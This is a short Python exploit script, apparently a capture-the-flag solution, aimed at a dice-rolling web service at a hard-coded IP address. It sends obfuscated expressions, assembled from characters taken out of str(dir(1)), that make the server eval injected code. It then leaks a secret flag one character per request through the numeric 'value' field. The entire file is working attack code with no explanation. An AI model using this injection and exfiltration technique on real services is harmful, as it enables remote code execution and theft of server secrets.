#!/usr/bin/python3
# coding: utf-8

import requests as req
import json
import time


def get_char(index):
    url = 'http://69.90.132.70:5100/roll'
    data = {
        'expr': 'roll(ord(eval(getattr(list(str(dir(1))),title1)(135)+getattr(list(str(dir(1))),title1)(52)+getattr(list(str(dir(1))),title1)(26)+getattr(list(str(dir(1))),title1)(191)+getattr(list(str(dir(1))),title1)(0)+str({0})+getattr(list(str(dir(1))),title1)())))'.format(index)
    }
    while True:
        r = req.post(url, data=data)
        if r.status_code == 200:
            break
        else:
            time.sleep(1)
    json_res = json.loads(r.text)
    return chr(json_res['value'])


def main():
    flag = ''
    for i in range(100):
        flag += get_char(i)
        print('[+] leaked flag (until {0}) :'.format(i), flag)
    print('[*] flag :', flag)


if __name__ == '__main__':
    main()

